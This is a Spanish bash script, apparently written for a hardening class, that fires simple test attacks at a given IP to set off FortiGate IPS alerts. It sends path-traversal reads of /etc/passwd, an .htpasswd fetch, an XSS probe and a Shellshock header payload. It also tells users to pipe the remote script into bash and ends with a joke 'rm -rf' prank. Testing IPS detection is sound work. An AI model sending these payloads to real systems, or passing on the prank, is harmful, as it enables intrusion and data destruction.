#!/bin/bash

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para instalar realizar ataques IPS a un FortiGate
#
# Ejecución remota con sudo:
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Simular-Ataque-IPS-Fortigate.sh | bash -s "172.16.0.209"
# ----------

vIP="$1"

# ----------

# Definir constantes de color
  cColorAzul="\033[0;34m"
  cColorAzulClaro="\033[1;34m"
  cColorVerde='\033[1;32m'
  cColorRojo='\033[1;31m'
  # Para el color rojo también:
    #echo "$(tput setaf 1)Mensaje en color rojo. $(tput sgr 0)"
  cFinColor='\033[0m'

# Comprobar si el paquete curl está instalado. Si no lo está, instalarlo.
  if [[ $(dpkg-query -s curl 2>/dev/null | grep installed) == "" ]]; then
    echo ""
    echo -e "${cColorRojo}  El paquete curl no está instalado. Iniciando su instalación...${cFinColor}"
    echo ""
    sudo apt-get -y update
    sudo apt-get -y install curl
    echo ""
  fi

# Definir constantes de color
  cColorAzul="\033[0;34m"
  cColorAzulClaro="\033[1;34m"
  cColorVerde='\033[1;32m'
  cColorRojo='\033[1;31m'
  # Para el color rojo también:
    #echo "$(tput setaf 1)Mensaje en color rojo. $(tput sgr 0)"
  cFinColor='\033[0m'

# Definir la cantidad de argumentos esperados
  cCantParamEsperados=1

# Comprobar que se hayan pasado la cantidad de parámetros correctos y proceder
  if [ $# -ne $cCantParamEsperados ]; then
    echo ""
    echo -e "${cColorRojo}  Mal uso del script. El uso correcto sería: ${cFinColor}"
    echo "    $0 [IPDeDestino]"
    echo ""
    echo "  Ejemplo:"
    echo "    $0 '172.16.0.209'"
    echo ""
    exit
  fi

# Crear el menú
  # Comprobar si el paquete dialog está instalado. Si no lo está, instalarlo.
    if [[ $(dpkg-query -s dialog 2>/dev/null | grep installed) == "" ]]; then
      echo ""
      echo -e "${cColorRojo}  El paquete dialog no está instalado. Iniciando su instalación...${cFinColor}"
      echo ""
      apt-get -y update
      apt-get -y install dialog
      echo ""
    fi
  menu=(dialog --checklist "Que tipo de ataque deseas ejecutar (marca con espacio y presiona Enter):" 22 80 16)
    opciones=(
      1 "Escalar hasta el archivo /etc/passwd del servidor."          off
      2 "Acceder a las credenciales de autenticación de una carpeta." off
      3 "Inyectar código Javascript malicioso."                       off
      4 "Acceder al archivo passwd del servidor usando PHP."          off
      5 "Ejecutar un comando de Bash en la cabecera TCP."             off
      6 "Odio a Iñigo 24."                                            off
    )
  choices=$("${menu[@]}" "${opciones[@]}" 2>&1 >/dev/tty)
  clear
    for choice in $choices
      do
        case $choice in

          1)

            echo ""
            echo -e "${cColorAzulClaro}  Intentando escalar hasta el archivo /etc/passwd del servidor...${cFinColor}"
            echo ""
            # Alerta: Web.Server.Password.File.Access
              curl -v "http://"$vIP":80/../../etc/passwd"
              echo ""
  
          ;;

          2)

            echo ""
            echo -e "${cColorAzulClaro}  Intentando acceder a las credenciales de autenticación de una carpeta...${cFinColor}"
            echo ""
            # Alerta: HTPasswd.Access
              curl -v "http://"$vIP":80/.htpasswd"
              echo ""

          ;;

          3)

            echo ""
            echo -e "${cColorAzulClaro}  Intentando inyectar código Javascript malicioso...${cFinColor}"
            echo ""
            # Alerta: Cross.Site.Scripting
              curl -v "http://"$vIP":80/search?query=<script>alert('XSS')</script>"
              echo ""

          ;;

          4)

            echo ""
            echo -e "${cColorAzulClaro}  Intentando acceder al archivo passwd del servidor usando PHP...${cFinColor}"
            echo ""
            # Alerta: Generic.Path.Traversal.Detection
              curl -v "http://"$vIP":80/index.php?page=../../../../etc/passwd"
              echo ""
  
          ;;

          5)

            echo ""
            echo -e "${cColorAzulClaro}  Intentando ejecutar un comando de Bash en la cabecera TCP...${cFinColor}"
            echo ""
            # Alerta: Bash.Function.Definitions.Remote.Code.Execution
              curl -v "http://"$vIP":80" -H "User-Agent: () { :; }; echo 'Exploit'"
              echo ""

          ;;

          6)

            echo ""
            echo -e "${cColorAzulClaro}  Intentando el ataque Odio a Iñigo 24...${cFinColor}"
            echo ""
            echo ""
            echo -e "${cColorRojo}  Has suspendido bastionado, por listo!  Sin embargo...${cFinColor}"
            echo ""
            echo -e "${cColorRojo}  Si borras el idioma fránces del sistema, podrás sacar, al menos, un 5.${cFinColor}"
            echo ""
            echo -e "${cColorRojo}  Puedes hacerlo con:${cFinColor}"
            echo ""
            echo -e "${cColorRojo}  rm -rf ...    (de Remove Muy Rapidly French)${cFinColor}"
            echo ""

          ;;

      esac

  done

